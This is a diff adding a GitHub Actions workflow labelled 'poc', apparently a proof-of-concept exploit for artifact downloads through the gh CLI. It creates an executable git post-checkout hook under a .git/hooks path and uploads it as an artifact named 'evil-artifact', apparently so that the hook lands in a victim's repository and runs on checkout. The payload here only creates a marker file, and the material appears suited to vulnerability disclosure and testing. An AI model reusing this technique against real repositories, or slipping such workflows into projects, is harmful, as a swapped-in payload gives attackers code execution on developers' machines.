@@ -1,0 +1,15 @@
+name: poc
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    permissions: {}
+    steps:
+      - run: |
+          mkdir -p .art/.git/hooks
+          printf '#!/bin/sh\ntouch "$PWD/PWNED_BY_GH_RUN_DOWNLOAD"\n' > .art/.git/hooks/post-checkout
+          chmod 755 .art/.git/hooks/post-checkout
+      - uses: actions/upload-artifact@v4
+        with:
+          name: evil-artifact
+          path: .art/.git/hooks/post-checkout
